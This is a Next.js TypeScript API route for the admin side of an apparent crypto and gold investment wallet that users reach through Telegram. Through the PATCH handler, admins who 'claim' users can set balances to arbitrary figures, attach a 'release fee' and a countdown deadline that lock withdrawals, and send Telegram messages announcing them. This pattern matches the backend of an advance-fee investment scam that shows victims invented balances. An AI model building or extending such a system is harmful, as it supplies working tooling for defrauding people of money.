import { NextRequest, NextResponse } from "next/server";
import { sql } from "@/lib/db";
import { getAdminIdentity } from "@/lib/auth";
import { sendTelegramMessage } from "@/lib/telegram";

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
  const identity = await getAdminIdentity();
  if (!identity.isAdmin) {
    return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
  }

  const userId = Number(params.id);
  if (!userId) {
    return NextResponse.json({ error: "Invalid user id" }, { status: 400 });
  }

  const userRows = await sql`
    SELECT id, telegram_id, first_name, last_name, username, phone, avatar_url, is_active, is_admin, is_super_admin, release_paid,
           assigned_admin_id, support_contact, btc_address, eth_address,
           release_fee_title, release_fee_note, release_fee_amount, release_fee_currency, release_deadline, created_at
    FROM users WHERE id = ${userId}
  `;
  if (userRows.length === 0) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }

  const target = userRows[0];
  if (!identity.isSuperAdmin && target.assigned_admin_id !== identity.userId) {
    return NextResponse.json({ error: "You have not claimed this user" }, { status: 403 });
  }

  const [balanceRows, transactionRows, investmentRows, withdrawalRows] = await Promise.all([
    sql`SELECT btc_amount, eth_amount, usd_cash, gold_amount, updated_at FROM balances WHERE user_id = ${userId}`,
    sql`SELECT id, type, amount, currency, status, note, created_at FROM transactions WHERE user_id = ${userId} ORDER BY created_at DESC LIMIT 50`,
    sql`
      SELECT i.id, i.amount, i.currency, i.status, i.started_at, i.matures_at, p.name AS plan_name
      FROM investments i JOIN investment_plans p ON p.id = i.plan_id
      WHERE i.user_id = ${userId} ORDER BY i.started_at DESC
    `,
    sql`SELECT id, amount, currency, wallet_address, status, admin_note, created_at FROM withdrawal_requests WHERE user_id = ${userId} ORDER BY created_at DESC`,
  ]);

  return NextResponse.json({
    user: target,
    balance: balanceRows[0] ?? { btc_amount: "0", eth_amount: "0", usd_cash: "0", gold_amount: "0" },
    transactions: transactionRows,
    investments: investmentRows,
    withdrawals: withdrawalRows,
  });
}

export async function PATCH(req: NextRequest, { params }: { params: { id: string } }) {
  const identity = await getAdminIdentity();
  if (!identity.isAdmin) {
    return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
  }

  const userId = Number(params.id);
  if (!userId) {
    return NextResponse.json({ error: "Invalid user id" }, { status: 400 });
  }

  const ownerCheck = await sql`SELECT assigned_admin_id FROM users WHERE id = ${userId}`;
  if (ownerCheck.length === 0) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }
  if (!identity.isSuperAdmin && ownerCheck[0].assigned_admin_id !== identity.userId) {
    return NextResponse.json({ error: "You have not claimed this user" }, { status: 403 });
  }

  const body = await req.json();
  const {
    firstName,
    lastName,
    phone,
    isActive,
    isAdmin: makeAdmin,
    isSuperAdmin: makeSuperAdmin,
    assignedAdminId,
    releasePaid,
    supportContact,
    btcAddress,
    ethAddress,
    releaseFeeTitle,
    releaseFeeNote,
    releaseFeeAmount,
    releaseFeeCurrency,
    releaseDeadline,
    btcAmount,
    ethAmount,
    usdCash,
    goldAmount,
    note,
  } = body;

  // Only a super-admin can grant or revoke plain admin access...
  const adminChange = identity.isSuperAdmin ? makeAdmin : undefined;
  // ...and only the password-based owner login can grant or revoke super-admin status.
  const superAdminChange = identity.isOwner ? makeSuperAdmin : undefined;

  // Only a super-admin can directly (re)assign or unassign a user's claiming admin.
  let assignedAdminChange: number | null | undefined = undefined;
  if (identity.isSuperAdmin && assignedAdminId !== undefined) {
    if (assignedAdminId === null) {
      assignedAdminChange = null;
    } else {
      const adminCheck = await sql`SELECT id FROM users WHERE id = ${assignedAdminId} AND (is_admin = true OR is_super_admin = true)`;
      if (adminCheck.length === 0) {
        return NextResponse.json({ error: "Not a valid admin" }, { status: 400 });
      }
      assignedAdminChange = Number(assignedAdminId);
    }
  }

  const notifications: string[] = [];

  if (
    firstName !== undefined ||
    lastName !== undefined ||
    phone !== undefined ||
    isActive !== undefined ||
    adminChange !== undefined ||
    superAdminChange !== undefined ||
    releasePaid !== undefined ||
    supportContact !== undefined ||
    btcAddress !== undefined ||
    ethAddress !== undefined ||
    releaseFeeTitle !== undefined ||
    releaseFeeNote !== undefined ||
    releaseFeeAmount !== undefined ||
    releaseFeeCurrency !== undefined ||
    releaseDeadline !== undefined ||
    assignedAdminChange !== undefined
  ) {
    await sql`
      UPDATE users SET
        first_name = COALESCE(${firstName ?? null}, first_name),
        last_name = COALESCE(${lastName ?? null}, last_name),
        phone = COALESCE(${phone ?? null}, phone),
        is_active = COALESCE(${isActive ?? null}, is_active),
        is_admin = COALESCE(${adminChange ?? null}, is_admin),
        is_super_admin = COALESCE(${superAdminChange ?? null}, is_super_admin),
        release_paid = COALESCE(${releasePaid ?? null}, release_paid),
        support_contact = CASE WHEN ${supportContact !== undefined} THEN ${supportContact ?? null} ELSE support_contact END,
        btc_address = CASE WHEN ${btcAddress !== undefined} THEN ${btcAddress ?? null} ELSE btc_address END,
        eth_address = CASE WHEN ${ethAddress !== undefined} THEN ${ethAddress ?? null} ELSE eth_address END,
        release_fee_title = CASE WHEN ${releaseFeeTitle !== undefined} THEN ${releaseFeeTitle ?? null} ELSE release_fee_title END,
        release_fee_note = CASE WHEN ${releaseFeeNote !== undefined} THEN ${releaseFeeNote ?? null} ELSE release_fee_note END,
        release_fee_amount = CASE WHEN ${releaseFeeAmount !== undefined} THEN ${releaseFeeAmount ?? null} ELSE release_fee_amount END,
        release_fee_currency = CASE WHEN ${releaseFeeCurrency !== undefined} THEN ${releaseFeeCurrency ?? null} ELSE release_fee_currency END,
        release_deadline = CASE WHEN ${releaseDeadline !== undefined} THEN ${releaseDeadline ?? null} ELSE release_deadline END,
        assigned_admin_id = CASE WHEN ${assignedAdminChange !== undefined} THEN ${assignedAdminChange ?? null} ELSE assigned_admin_id END
      WHERE id = ${userId}
    `;

    if (isActive !== undefined) {
      notifications.push(isActive ? "Your account has been reactivated." : "Your account has been deactivated.");
    }
    if (adminChange === true) {
      notifications.push("You have been granted admin access to the wallet.");
    }
    if (superAdminChange === true) {
      notifications.push("You have been granted super-admin access — you can now see and manage every user.");
    }
    if (releasePaid === true) {
      notifications.push("Your release fee has been confirmed. Investment plans and withdrawals are now unlocked.");
    }
    if (releaseFeeAmount !== undefined && releaseFeeAmount !== null) {
      notifications.push(
        `A release fee of ${releaseFeeAmount} ${releaseFeeCurrency || "USD"} has been set on your account. Check the Release Funds page for details.`
      );
    }
    if (releaseDeadline !== undefined && releaseDeadline !== null) {
      notifications.push(
        `A release deadline has been set on your account: ${new Date(releaseDeadline).toLocaleString()}. Check the Release Funds page for your countdown.`
      );
    }
  }

  if (btcAmount !== undefined || ethAmount !== undefined || usdCash !== undefined || goldAmount !== undefined) {
    const existing = await sql`SELECT id, btc_amount, eth_amount, usd_cash, gold_amount FROM balances WHERE user_id = ${userId}`;

    const newBtc = btcAmount !== undefined ? Number(btcAmount) : Number(existing[0]?.btc_amount ?? 0);
    const newEth = ethAmount !== undefined ? Number(ethAmount) : Number(existing[0]?.eth_amount ?? 0);
    const newUsd = usdCash !== undefined ? Number(usdCash) : Number(existing[0]?.usd_cash ?? 0);
    const newGold = goldAmount !== undefined ? Number(goldAmount) : Number(existing[0]?.gold_amount ?? 0);

    if (existing.length === 0) {
      await sql`INSERT INTO balances (user_id, btc_amount, eth_amount, usd_cash, gold_amount) VALUES (${userId}, ${newBtc}, ${newEth}, ${newUsd}, ${newGold})`;
    } else {
      await sql`UPDATE balances SET btc_amount = ${newBtc}, eth_amount = ${newEth}, usd_cash = ${newUsd}, gold_amount = ${newGold}, updated_at = NOW() WHERE user_id = ${userId}`;
    }

    await sql`
      INSERT INTO transactions (user_id, type, amount, currency, status, note)
      VALUES (${userId}, 'adjustment', 0, 'USD', 'completed', ${note || "Balance adjusted by admin"})
    `;

    notifications.push(
      `Your balance was updated: ${newBtc} BTC, ${newEth} ETH, ${newGold} oz gold, $${newUsd} cash.${note ? ` Note: ${note}` : ""}`
    );
  } else if (note) {
    await sql`
      INSERT INTO transactions (user_id, type, amount, currency, status, note)
      VALUES (${userId}, 'adjustment', 0, 'USD', 'completed', ${note})
    `;
    notifications.push(`A note was added to your account: ${note}`);
  }

  if (notifications.length > 0) {
    const userRows = await sql`SELECT telegram_id FROM users WHERE id = ${userId}`;
    const telegramId = userRows[0]?.telegram_id;
    if (telegramId) {
      await sendTelegramMessage(telegramId, notifications.join("\n\n"));
    }
  }

  return NextResponse.json({ success: true });
}

/**
 * Permanently deletes a user and every row referencing them. Super-admin only.
 * Lets a user re-authenticate from scratch via the bot — a fresh row is
 * inserted on next /api/auth/telegram call, so notifications/phone gates
 * are re-triggered as if they were brand new.
 */
export async function DELETE(req: NextRequest, { params }: { params: { id: string } }) {
  const identity = await getAdminIdentity();
  if (!identity.isSuperAdmin) {
    return NextResponse.json({ error: "Only a super-admin can delete users" }, { status: 403 });
  }

  const userId = Number(params.id);
  if (!userId) {
    return NextResponse.json({ error: "Invalid user id" }, { status: 400 });
  }

  const existing = await sql`SELECT id FROM users WHERE id = ${userId}`;
  if (existing.length === 0) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }

  await sql`UPDATE users SET assigned_admin_id = NULL WHERE assigned_admin_id = ${userId}`;
  await sql`DELETE FROM user_documents WHERE user_id = ${userId} OR uploaded_by_admin_id = ${userId}`;
  await sql`DELETE FROM transactions WHERE user_id = ${userId}`;
  await sql`DELETE FROM investments WHERE user_id = ${userId}`;
  await sql`DELETE FROM withdrawal_requests WHERE user_id = ${userId}`;
  await sql`DELETE FROM balances WHERE user_id = ${userId}`;
  await sql`DELETE FROM users WHERE id = ${userId}`;

  return NextResponse.json({ success: true });
}
